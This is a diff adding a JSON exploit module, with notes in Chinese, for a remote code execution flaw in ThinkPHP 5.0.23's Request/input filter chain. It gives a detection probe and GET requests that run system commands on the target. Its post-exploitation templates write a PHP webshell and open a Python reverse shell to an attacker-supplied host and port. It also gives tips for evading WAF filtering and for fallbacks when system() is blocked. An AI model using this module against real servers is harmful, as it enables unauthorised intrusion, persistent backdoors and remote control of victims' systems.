@@ -1,0 +1,126 @@
+{
+  "id": "thinkphp-5.0.23-request-input-rce",
+  "family": "thinkphp",
+  "product": "ThinkPHP",
+  "cve": "N/A",
+  "aliases": [
+    "ThinkPHP 5.0.23 request input RCE",
+    "ThinkPHP 5.0.23 filter chain RCE"
+  ],
+  "severity": "critical",
+  "tags": [
+    "thinkphp",
+    "request-input",
+    "filter",
+    "rce",
+    "5.0.23"
+  ],
+  "applicability": {
+    "versions": [
+      "5.0.23"
+    ],
+    "fingerprints": [
+      "请求可到达 /index.php?s=index/\\think\\Request/input",
+      "目标存在典型 ThinkPHP 5.0.23 路由风格与异常输出",
+      "filter 与 data 参数控制响应内容"
+    ],
+    "signals": [
+      "harmless md5 测试可把 data 变换后回显",
+      "大小写敏感的命名空间路径更接近 5.0.23 栈",
+      "目标看起来是较老旧的 ThinkPHP 5.0.x 部署"
+    ]
+  },
+  "preconditions": [
+    "请求参数可直接进入 Request/input 过滤链。",
+    "前控制器未禁用该调度路径。",
+    "WAF 未完全阻断 filter/data 参数组合。"
+  ],
+  "verification": {
+    "method": "http_get",
+    "requests": [
+      {
+        "path": "/index.php?s=index/\\think\\Request/input&filter=md5&data=thinkphp523",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0",
+          "Accept": "*/*"
+        },
+        "data": "",
+        "matchers": [
+          "cbc4223b451be62155c1fc7e201b28d9",
+          "正文中出现已知 md5 值"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "rce",
+    "requests": [
+      {
+        "path": "/index.php?s=index/\\think\\Request/input&filter=system&data=id",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "",
+        "os_hint": "linux"
+      },
+      {
+        "path": "/index.php?s=index/\\think\\Request/input&filter=system&data=whoami",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "",
+        "os_hint": "unknown"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "先确认执行结果是否稳定直出，再决定是否继续走命令回显链。",
+      "对老旧 ThinkPHP 部署，优先找 runtime、public、uploads、日志目录等可写位置。",
+      "如果目标在容器里，先做 hostname、ip route、env、mount 这类低风险探针。"
+    ],
+    "shell_options": [
+      {
+        "type": "php_webshell_write",
+        "template": "echo '<?php if(isset($_POST[\"c\"])){system($_POST[\"c\"]);} ?>' > {writable_path}/tp523.php"
+      },
+      {
+        "type": "python_reverse_shell",
+        "template": "python -c 'import os,pty,socket;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "先用 md5 探针确认 filter/data 可控。",
+      "再执行 id、whoami、pwd 等低噪声命令。",
+      "如果命令回显可行，优先切换为文件写入或会话复用。"
+    ],
+    "safe_commands": [
+      "id",
+      "whoami",
+      "pwd",
+      "hostname",
+      "cat /etc/issue"
+    ],
+    "shell_prerequisites": [
+      "确认 filter=system 不会被服务器端黑名单替换。",
+      "确认数据中的空格、分号等不会被 URL 编码处理破坏。"
+    ],
+    "fallbacks": [
+      "如果 system 被禁，尝试 shell_exec、assert 或其他本地可用函数。",
+      "如果只有盲回显，结合响应时间差、日志写入或 side-channel 验证。"
+    ]
+  },
+  "detection_notes": [
+    "该链路非常适合做低破坏验证，因为 md5 变换几乎不影响目标状态。",
+    "部分站点会在代理层拦截 think\\Request，必要时可换大小写或编码试探。"
+  ],
+  "references": [
+    "Vulhub ThinkPHP 5.0.23 reproduction",
+    "Public ThinkPHP request/input filter chain analyses"
+  ]
+}
